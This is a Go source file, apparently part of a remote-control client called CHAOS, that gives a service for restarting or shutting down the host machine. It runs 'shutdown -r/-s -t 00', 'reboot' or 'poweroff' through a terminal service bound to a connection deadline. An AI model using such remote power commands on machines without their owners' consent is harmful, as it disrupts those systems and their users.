package os

import (
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"runtime"
)

type OperatingSystemService struct {
	Configuration *environment.Configuration
	Terminal      services.Terminal
}

func NewOperatingSystemService(configuration *environment.Configuration, terminal services.Terminal) services.OS {
	return &OperatingSystemService{
		Configuration: configuration,
		Terminal:      terminal,
	}
}

func (os OperatingSystemService) Restart() error {
	switch runtime.GOOS {
	case `windows`:
		os.Terminal.Run("shutdown -r -t 00", os.Configuration.Connection.ContextDeadline)
		break
	case `linux`:
		os.Terminal.Run("reboot", os.Configuration.Connection.ContextDeadline)
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (os OperatingSystemService) Shutdown() error {
	switch runtime.GOOS {
	case `windows`:
		os.Terminal.Run("shutdown -s -t 00", os.Configuration.Connection.ContextDeadline)
		break
	case `linux`:
		os.Terminal.Run("poweroff", os.Configuration.Connection.ContextDeadline)
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}
